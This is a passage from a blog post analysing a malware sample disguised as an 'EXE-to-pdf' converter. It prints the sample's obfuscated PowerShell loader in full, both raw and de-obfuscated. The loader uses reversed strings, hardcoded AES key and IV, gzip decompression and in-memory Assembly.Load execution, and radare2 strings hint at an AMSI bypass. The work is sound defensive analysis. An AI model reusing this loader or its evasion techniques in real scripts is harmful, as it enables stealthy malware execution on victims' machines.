[System.Reflection.Assembly]::(&#39;daoL&#39;[-1..-4] -join &#39;&#39;)($VGGCQ);$iFZWS = $WtHIs.EntryPoint;$iFZWS.Invoke($null, (, [string[]] (&#39;%*&#39;)))
</span></span><span class=line><span class=cl>exit /b
</span></span></code></pre></div><p>Let&rsquo;s try and understand this script line by line&mldr; just like an interpreter üòâ</p><ul><li><p><code>@echo off</code> prevents the prompt and contents of the batch file from being displayed, so that only the output is visible. The <code>@</code> makes the output of the <code>echo off</code> command hidden as well. If you are into bad things or preventing bad things to happen - this is like a defacto starting command for all batch scripts.</p></li><li><p><code>net file</code> without any extra argumnents this displays all the open shared files on a server and the lock-ids (if any). I&rsquo;m not completely sure why this is used but anyways</p></li><li><p>Then it checks <code>errorlevel</code>, it is not <code>0</code> then it&rsquo;ll run some powershell command. I&rsquo;m not very good with windows and it&rsquo;s tools at this point but it is very clear that is executing something with <code>-ep bypass</code> to prevent any warnings or prompts. <em><a href="https://www.urbandictionary.com/define.php?term=sus">Sus</a> it is, isn&rsquo;t it?</em></p></li><li><p>After changing directory (where it can put all his mess, without being sus), it copies the powershell binary and saves it with another name.</p></li><li><p>Clears the screen to remove all the output generated. Above tasks will be in a flash and you probably will just see a blink on terminal if you have <a href="https://duckduckgo.com/?q=Veronica+Seider%27s+Super+Power+wikipedia&amp;ia=web">Veronica Seider‚Äôs Super Power</a>. <em>Bad Joke, I know.</em></p></li><li><p>Eventually, it&rsquo;ll use the copied & renamed powershell to run some <strong><code>-command</code></strong> with <code>-ep bypass</code> flag. After a bit of google-fu I got to know about few common techniques used to bypass powershell execution policy. I found <a href=https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/>this blog</a> <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> concise and helpful for the same topic.</p></li></ul><h4 id=de-obfuscating-powershell>de-obfuscating powershell<a hidden class=anchor aria-hidden=true href=#de-obfuscating-powershell>#</a></h4><p>I copied the powershell <strong><code>-command</code></strong> to another file, just to make more sense of it. And it looked better than before.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps1 data-lang=ps1><span class=line><span class=cl><span class=nv>$eaqcw</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::(</span><span class=s1>&#39;txeTllAdaeR&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-11</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;%~f0&#39;</span><span class=p>).</span><span class=py>Split</span><span class=p>([</span><span class=no>Environment</span><span class=p>]::</span><span class=n>NewLine</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$VtoBl</span> <span class=k>in</span> <span class=nv>$eaqcw</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$VtoBl</span><span class=p>.</span><span class=py>StartsWith</span><span class=p>(</span><span class=s1>&#39;:: &#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$BMjJe</span> <span class=p>=</span> <span class=nv>$VtoBl</span><span class=p>.</span><span class=py>Substring</span><span class=p>(</span><span class=mf>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=p>};</span> 
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nv>$VGGCQ</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=nv>$BMjJe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Cryptography</span><span class=p>.</span><span class=n>AesManaged</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span><span class=p>.</span><span class=py>Mode</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.CipherMode</span><span class=p>]::</span><span class=n>CBC</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span><span class=p>.</span><span class=py>Padding</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.PaddingMode</span><span class=p>]::</span><span class=n>PKCS7</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span><span class=p>.</span><span class=py>Key</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span><span class=p>.</span><span class=py>IV</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$CfOAS</span> <span class=p>=</span> <span class=nv>$hbvqO</span><span class=p>.</span><span class=py>CreateDecryptor</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$VGGCQ</span> <span class=p>=</span> <span class=nv>$CfOAS</span><span class=p>.</span><span class=py>TransformFinalBlock</span><span class=p>(</span><span class=nv>$VGGCQ</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$VGGCQ</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$CfOAS</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$hbvqO</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$YVjlv</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=py>MemoryStream</span><span class=p>(,</span> <span class=nv>$VGGCQ</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$iJFSw</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=n>MemoryStream</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$uwkaq</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=py>Compression</span><span class=p>.</span><span class=py>GZipStream</span><span class=p>(</span><span class=nv>$YVjlv</span><span class=p>,</span> <span class=p>[</span><span class=no>IO.Compression.CompressionMode</span><span class=p>]::</span><span class=n>Decompress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$uwkaq</span><span class=p>.</span><span class=py>CopyTo</span><span class=p>(</span><span class=nv>$iJFSw</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$uwkaq</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$YVjlv</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$iJFSw</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$VGGCQ</span> <span class=p>=</span> <span class=nv>$iJFSw</span><span class=p>.</span><span class=py>ToArray</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$WtHIs</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Reflection.Assembly</span><span class=p>]::(</span><span class=s1>&#39;daoL&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-4</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=nv>$VGGCQ</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$iFZWS</span> <span class=p>=</span> <span class=nv>$WtHIs</span><span class=p>.</span><span class=n>EntryPoint</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$iFZWS</span><span class=p>.</span><span class=py>Invoke</span><span class=p>(</span><span class=vm>$null</span><span class=p>,</span> <span class=p>(,</span> <span class=p>[</span><span class=no>string[]</span><span class=p>]</span> <span class=p>(</span><span class=s1>&#39;%*&#39;</span><span class=p>)))</span>
</span></span></code></pre></div><p>If I did not mention this earlier, I&rsquo;m not good with windows OS and powershell scripting, but with decent knowledge about programming/scripting languages and a text editor of choice, it was not so hard to make this code understandable. De-obfuscated file can be found on github here -> <a href=https://github.com/ayedaemon/Exe-to-pdf/blob/main/powershell_command_deobfuscated.txt>https://github.com/ayedaemon/Exe-to-pdf/blob/main/powershell_command_deobfuscated.txt</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps1 data-lang=ps1><span class=line><span class=cl><span class=c>## Read the initial payload file</span>
</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::(</span><span class=s1>&#39;txeTllAdaeR&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-11</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;/ExploitBuilder.bat&#39;</span><span class=p>).</span><span class=py>Split</span><span class=p>([</span><span class=no>Environment</span><span class=p>]::</span><span class=n>NewLine</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Get the line starting with `:: `; This also acts as the comment in batch scripting</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$each_line</span> <span class=k>in</span> <span class=nv>$payload</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nv>$each_line</span><span class=p>.</span><span class=py>StartsWith</span><span class=p>(</span><span class=s1>&#39;:: &#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$comment_line</span> <span class=p>=</span> <span class=nv>$each_line</span><span class=p>.</span><span class=py>Substring</span><span class=p>(</span><span class=mf>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=p>};</span> 
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Decode the comment line with &#34;Military grade AES encryption&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$decoded_comment_line</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=nv>$comment_line</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Security</span><span class=p>.</span><span class=py>Cryptography</span><span class=p>.</span><span class=n>AesManaged</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span><span class=p>.</span><span class=py>Mode</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.CipherMode</span><span class=p>]::</span><span class=n>CBC</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span><span class=p>.</span><span class=py>Padding</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Security.Cryptography.PaddingMode</span><span class=p>]::</span><span class=n>PKCS7</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span><span class=p>.</span><span class=py>Key</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;wYPqphQqHyVIeW2CaPqkTUCy/0ecJs6agKij7Q3HRY4=&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span><span class=p>.</span><span class=py>IV</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Convert</span><span class=p>]::(</span><span class=s1>&#39;gnirtS46esaBmorF&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-16</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=s1>&#39;E55hmIoW8UIQx1ajzTvfAA==&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$decryptObj</span> <span class=p>=</span> <span class=nv>$cryptObj</span><span class=p>.</span><span class=py>CreateDecryptor</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$decrypted_comment_line</span> <span class=p>=</span> <span class=nv>$decryptObj</span><span class=p>.</span><span class=py>TransformFinalBlock</span><span class=p>(</span><span class=nv>$decoded_comment_line</span><span class=p>,</span> <span class=mf>0</span><span class=p>,</span> <span class=nv>$decoded_comment_line</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$decryptObj</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$cryptObj</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Shuffle the data throught memory streams and decompress it (gzip decompression)</span>
</span></span><span class=line><span class=cl><span class=nv>$decrypted_stream</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=py>MemoryStream</span><span class=p>(,</span> <span class=nv>$decrypted_comment_line</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$extra_stream</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=n>MemoryStream</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ungzip_decrypted_stream</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>IO</span><span class=p>.</span><span class=py>Compression</span><span class=p>.</span><span class=py>GZipStream</span><span class=p>(</span><span class=nv>$decrypted_stream</span><span class=p>,</span> <span class=p>[</span><span class=no>IO.Compression.CompressionMode</span><span class=p>]::</span><span class=n>Decompress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ungzip_decrypted_stream</span><span class=p>.</span><span class=py>CopyTo</span><span class=p>(</span><span class=nv>$extra_stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$ungzip_decrypted_stream</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$decrypted_stream</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$extra_stream</span><span class=p>.</span><span class=py>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>## Load the final binary and execute it</span>
</span></span><span class=line><span class=cl><span class=nv>$asm</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Reflection.Assembly</span><span class=p>]::(</span><span class=s1>&#39;daoL&#39;</span><span class=p>[</span><span class=mf>-1</span><span class=p>..</span><span class=mf>-4</span><span class=p>]</span> <span class=n>-join</span> <span class=s1>&#39;&#39;</span><span class=p>)(</span><span class=nv>$decrypted_array</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$asm_entrypoint</span> <span class=p>=</span> <span class=nv>$asm</span><span class=p>.</span><span class=n>EntryPoint</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$asm_entrypoint</span><span class=p>.</span><span class=py>Invoke</span><span class=p>(</span><span class=vm>$null</span><span class=p>,</span> <span class=p>(,</span> <span class=p>[</span><span class=no>string[]</span><span class=p>]</span> <span class=p>(</span><span class=s1>&#39;%*&#39;</span><span class=p>)))</span>
</span></span></code></pre></div><p>There are tons of obfuscation techniques that can be used by a hacker or a professional, but the final goal is common - To make it harder to read and interpret. Here is a <a href=https://www.offensive-security.com/offsec/powershell-obfuscation/>blog by Offensive-Security on powershell obfuscation</a> <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> that helped me to gain knowledge about how powershell malwares are usually obfuscated.</p><p>This malware specifically used some good techniques:-</p><ul><li>changing the variable names to random characters</li><li>String reversal techniques for powershell commands.</li><li>Key based cryptography to encrypt the malicious payload.</li><li>Compressing the payload to prevent detection</li><li>Decompressing in memory streams to make it somewhat fileless and hard to detect.</li></ul><p>&mldr;but the method employed to hide the payload in comments actually astounded me.</p><h4 id=windows-exe-file>Windows EXE file<a hidden class=anchor aria-hidden=true href=#windows-exe-file>#</a></h4><p>There were several steps within a single line powershell command, that were eventually loading and executing the actual malware. Instead of writing my own functions to reverse engineer everything the author has done, I took the lazy approach and let his code do most of the work&mldr;and just before the loading & execution segment, I dumped the binary. ü§≠</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ps1 data-lang=ps1><span class=line><span class=cl><span class=c>## Dump exe file before loading and executing</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$extra_stream</span><span class=p>.</span><span class=py>ToArray</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=p>&gt;</span> <span class=n>extra_stream</span><span class=p>.</span><span class=py>exe</span><span class=p>.</span><span class=py>txt</span>
</span></span></code></pre></div><p><em>How I know it is an EXE file? &mldr;Simply by looking at the <a href=https://en.wikipedia.org/wiki/Magic_number_(programming)>magic numbers</a> of the obtained file</em></p><p>All the obfuscation, just to make sure that this <code>exe</code> file gets executed. ü§¶ Well, now it&rsquo;s time to analyze the binary file we just extracted and see if we can figure out the truth about this <strong>EXE-to-pdf</strong> program. For this, I quickly launched up <a href=https://rada.re/n/radare2.html><code>radare2</code></a> <sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup> in another terminal and started analysing the file. <em>Why Radare2?? I prefer stayting in the terminal&mldr;And it is an amazing tool</em> :)</p><p><strong>What does all Reverse Engineering 101 books say??</strong> - grab some basic info about the binary file and dump all strings to support the existing hypothesis and build on it.</p><p>So I did that..</p><p><strong>Basic info</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>file     extra_stream.exe.txt
</span></span><span class=line><span class=cl>size     0x409f
</span></span><span class=line><span class=cl>humansz  16.2K
</span></span><span class=line><span class=cl>minopsz  1
</span></span><span class=line><span class=cl>maxopsz  16
</span></span><span class=line><span class=cl>invopsz  1
</span></span><span class=line><span class=cl>mode     r-x
</span></span><span class=line><span class=cl>format   any
</span></span><span class=line><span class=cl>iorw     false
</span></span><span class=line><span class=cl>block    0x100
</span></span></code></pre></div><p><strong>Strings (omitted)</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>211 0x0000271a 0x0000271a 20  21           ascii   BJEtuQtQCkWlpTOkRPdJ
</span></span><span class=line><span class=cl>212 0x0000272f 0x0000272f 20  21           ascii   OzLDUBlAcSBIOPOJLBlh
</span></span><span class=line><span class=cl>213 0x00002744 0x00002744 20  21           ascii   BDltEFgkoicgcKNaARhF
</span></span><span class=line><span class=cl>214 0x00002759 0x00002759 20  21           ascii   QvYrospzbuUnUAXNVABe
</span></span><span class=line><span class=cl>215 0x0000276e 0x0000276e 20  21           ascii   joIOHkxVlAiZHoYgFUel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>316 0x00002ce8 0x00002ce8 14  15           ascii   RuntimeHelpers
</span></span><span class=line><span class=cl>317 0x00002cf7 0x00002cf7 5   6            ascii   Array
</span></span><span class=line><span class=cl>318 0x00002cfd 0x00002cfd 18  19           ascii   RuntimeFieldHandle
</span></span><span class=line><span class=cl>319 0x00002d10 0x00002d10 15  16           ascii   InitializeArray
</span></span><span class=line><span class=cl>320 0x00002d20 0x00002d20 19  20           ascii   $$method0x6000003-2
</span></span><span class=line><span class=cl>321 0x00002d34 0x00002d34 7   8            ascii   UIntPtr
</span></span><span class=line><span class=cl>322 0x00002d3c 0x00002d3c 11  12           ascii   op_Explicit
</span></span><span class=line><span class=cl>323 0x00002d48 0x00002d48 4   5            ascii   Copy
</span></span><span class=line><span class=cl>324 0x00002d4d 0x00002d4d 17  18           ascii   System.Reflection
</span></span><span class=line><span class=cl>325 0x00002d5f 0x00002d5f 8   9            ascii   Assembly
</span></span><span class=line><span class=cl>326 0x00002d68 0x00002d68 20  21           ascii   GetExecutingAssembly
</span></span><span class=line><span class=cl>327 0x00002d7d 0x00002d7d 24  25           ascii   GetManifestResourceNames
</span></span><span class=line><span class=cl>328 0x00002d96 0x00002d96 13  14           ascii   WriteAllBytes
</span></span><span class=line><span class=cl>329 0x00002da4 0x00002da4 16  17           ascii   System.Threading
</span></span><span class=line><span class=cl>330 0x00002db5 0x00002db5 11  12           ascii   ThreadStart
</span></span><span class=line><span class=cl>331 0x00002dc1 0x00002dc1 6   7            ascii   Thread
</span></span><span class=line><span class=cl>332 0x00002dc8 0x00002dc8 4   5            ascii   Char
</span></span><span class=line><span class=cl>333 0x00002dcd 0x00002dcd 5   6            ascii   Split
</span></span><span class=line><span class=cl>334 0x00002dd3 0x00002dd3 4   5            ascii   Load
</span></span><span class=line><span class=cl>335 0x00002dd8 0x00002dd8 10  11           ascii   MethodInfo
</span></span><span class=line><span class=cl>336 0x00002de3 0x00002de3 14  15           ascii   get_EntryPoint
</span></span><span class=line><span class=cl>337 0x00002df2 0x00002df2 10  11           ascii   MethodBase
</span></span><span class=line><span class=cl>338 0x00002dfd 0x00002dfd 16  17           ascii   ProcessStartInfo
</span></span><span class=line><span class=cl>339 0x00002e0e 0x00002e0e 6   7            ascii   Concat
</span></span><span class=line><span class=cl>340 0x00002e15 0x00002e15 13  14           ascii   set_Arguments
</span></span><span class=line><span class=cl>341 0x00002e23 0x00002e23 18  19           ascii   ProcessWindowStyle
</span></span><span class=line><span class=cl>342 0x00002e36 0x00002e36 15  16           ascii   set_WindowStyle
</span></span><span class=line><span class=cl>343 0x00002e46 0x00002e46 18  19           ascii   set_CreateNoWindow
</span></span><span class=line><span class=cl>344 0x00002e59 0x00002e59 12  13           ascii   set_FileName
</span></span><span class=line><span class=cl>345 0x00002e66 0x00002e66 11  12           ascii   System.Core
</span></span><span class=line><span class=cl>346 0x00002e72 0x00002e72 28  29           ascii   System.Security.Cryptography
</span></span><span class=line><span class=cl>347 0x00002e8f 0x00002e8f 10  11           ascii   AesManaged
</span></span><span class=line><span class=cl>348 0x00002e9a 0x00002e9a 18  19           ascii   SymmetricAlgorithm
</span></span><span class=line><span class=cl>349 0x00002ead 0x00002ead 10  11           ascii   CipherMode
</span></span><span class=line><span class=cl>350 0x00002eb8 0x00002eb8 8   9            ascii   set_Mode
</span></span><span class=line><span class=cl>351 0x00002ec1 0x00002ec1 11  12           ascii   PaddingMode
</span></span><span class=line><span class=cl>352 0x00002ecd 0x00002ecd 11  12           ascii   set_Padding
</span></span><span class=line><span class=cl>353 0x00002ed9 0x00002ed9 16  17           ascii   ICryptoTransform
</span></span><span class=line><span class=cl>354 0x00002eea 0x00002eea 15  16           ascii   CreateDecryptor
</span></span><span class=line><span class=cl>355 0x00002efa 0x00002efa 19  20           ascii   TransformFinalBlock
</span></span><span class=line><span class=cl>356 0x00002f0e 0x00002f0e 12  13           ascii   MemoryStream
</span></span><span class=line><span class=cl>357 0x00002f1b 0x00002f1b 21  22           ascii   System.IO.Compression
</span></span><span class=line><span class=cl>358 0x00002f31 0x00002f31 10  11           ascii   GZipStream
</span></span><span class=line><span class=cl>359 0x00002f3c 0x00002f3c 6   7            ascii   Stream
</span></span><span class=line><span class=cl>360 0x00002f43 0x00002f43 15  16           ascii   CompressionMode
</span></span><span class=line><span class=cl>361 0x00002f53 0x00002f53 6   7            ascii   CopyTo
</span></span><span class=line><span class=cl>362 0x00002f5a 0x00002f5a 7   8            ascii   ToArray
</span></span><span class=line><span class=cl>363 0x00002f62 0x00002f62 25  26           ascii   GetManifestResourceStream
</span></span><span class=line><span class=cl>364 0x00002f7c 0x00002f7c 11  12           ascii   payload.exe
</span></span><span class=line><span class=cl>365 0x00002f8a 0x00002f8a 34  69           utf16le Select * from Win32_ComputerSystem
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>373 0x00003070 0x00003070 44  89           utf16le Ok++WI0tak7DdF3uV9x+8O7wJaTIlfxMVTMno9KXut4=
</span></span><span class=line><span class=cl>374 0x000030ca 0x000030ca 44  90           utf16le +uLTyyminmCZeXdFSCeWyXEOtzicLz4HHy5dikdWUWc=
</span></span><span class=line><span class=cl>375 0x00003124 0x00003124 24  49           utf16le WTltvoM17r/Ehimm8ynucg==
</span></span><span class=line><span class=cl>376 0x00003156 0x00003156 44  89           utf16le amZLVSQJiUQKj6Rv/kTQ8kyn+kGd0mUv6VK0wS/w3/E=
</span></span><span class=line><span class=cl>377 0x000031b0 0x000031b0 14  29           utf16le VirtualProtect
</span></span><span class=line><span class=cl>378 0x000031ce 0x000031ce 8   18           utf16le amsi.dll
</span></span><span class=line><span class=cl>379 0x000031e0 0x000031e0 24  49           utf16le WG/Dged0cIrjNUQv5M9ONw==
</span></span><span class=line><span class=cl>380 0x00003212 0x00003212 9   20           utf16le ntdll.dll
</span></span><span class=line><span class=cl>381 0x00003226 0x00003226 24  50           utf16le KMgwS70BP93VTwRv09KJTQ==
</span></span><span class=line><span class=cl>382 0x00003258 0x00003258 24  50           utf16le ZoHIhlSGD8rN6cc5D8M/MA==
</span></span><span class=line><span class=cl>383 0x0000328a 0x0000328a 24  49           utf16le shwnMnkYp+bePn1r9fIgQg==
</span></span><span class=line><span class=cl>384 0x000032c3 0x000032c3 63  127          utf16le MNbxejM5jxzm3r5TKG6sPhlK6QF/D8w6/aOC8lz9bfMr26dy72cAJCSoDcBoN3Q
</span></span><span class=line><span class=cl>385 0x00003343 0x00003343 9   19           utf16le &#34; &amp; del &#34;
</span></span><span class=line><span class=cl>386 0x0000335b 0x0000335b 7   16           utf16le cmd.exe
</span></span></code></pre></div><p>There are base64 encoded strings, interesting function calls and interesting strings in this binary, which I can look up and figure out what this file does. It will be so easy!!</p><p><img loading=lazy src=https://media.giphy.com/media/2fLdG18W5BLI5uzOHk/giphy.gif#center alt></p><p>But to my surprise, it was not at all easy&mldr; Or maybe I&rsquo;m just not worthy yet.</p><ul><li><p>All the base64 strings are not readable. Although I&rsquo;ve a feeling that these strings are used in similar fashion as they were used in previous powershell payload.</p></li><li><p>Even after looking in the memory area where the intriguing strings are pointed, I was unable to find anything that made sense to me.</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>[0x00002f70]&gt; pd 20
</span></span><span class=line><span class=cl>            ; CODE XREF from fcn.00000000 @ +0x2f01
</span></span><span class=line><span class=cl>            0x00002f70      6f             outsd dx, dword [rsi]
</span></span><span class=line><span class=cl>        ‚îå‚îÄ&lt; 0x00002f71      7572           jne 0x2fe5
</span></span><span class=line><span class=cl>        ‚îÇ   0x00002f73      636553         movsxd rsp, dword [rbp + 0x53]
</span></span><span class=line><span class=cl>       ‚îå‚îÄ‚îÄ&lt; 0x00002f76      7472           je 0x2fea
</span></span><span class=line><span class=cl>       ‚îÇ‚îÇ   0x00002f78      65             invalid
</span></span><span class=line><span class=cl>       ‚îÇ‚îÇ   0x00002f79      61             invalid
</span></span><span class=line><span class=cl>       ‚îÇ‚îÇ   0x00002f7a      6d             insd dword [rdi], dx
</span></span><span class=line><span class=cl>       ‚îÇ‚îÇ   0x00002f7b      007061         add byte [rax + 0x61], dh
</span></span><span class=line><span class=cl>      ‚îå‚îÄ‚îÄ‚îÄ&lt; 0x00002f7e      796c           jns 0x2fec
</span></span><span class=line><span class=cl>      ‚îÇ‚îÇ‚îÇ   0x00002f80      6f             outsd dx, dword [rsi]
</span></span><span class=line><span class=cl>      ‚îÇ‚îÇ‚îÇ   0x00002f81      61             invalid
